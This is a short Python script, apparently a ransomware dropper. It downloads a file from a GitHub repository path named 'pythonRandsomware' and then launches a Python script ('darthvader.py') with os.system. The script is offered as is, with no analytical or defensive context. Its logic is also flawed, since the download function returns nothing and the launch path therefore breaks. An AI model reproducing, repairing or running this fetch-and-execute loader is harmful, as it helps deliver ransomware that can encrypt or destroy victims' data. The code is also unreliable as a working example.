# Author: SergioZ3R0
import platform
import requests
import os

def get_system_info():
    system = platform.system()
    arch = platform.machine()
    return system, arch

def download_executable():
    url = "https://raw.githubusercontent.com/SergioZ3R0/Sergio-Code/refs/heads/master/cyberSec/pythonRandsomware"
    response = requests.get(url)
    if response.status_code == 200:
        with open(os.path.basename(url), 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {os.path.basename(url)}")
    else:
        print(f"Failed to download {os.path.basename(url)}")

if __name__ == "__main__":
    system, arch = get_system_info()
    try:
        file_path = download_executable()
        os.system(f"python {file_path}/darthvader.py")
    except ValueError as e:
        print(e)

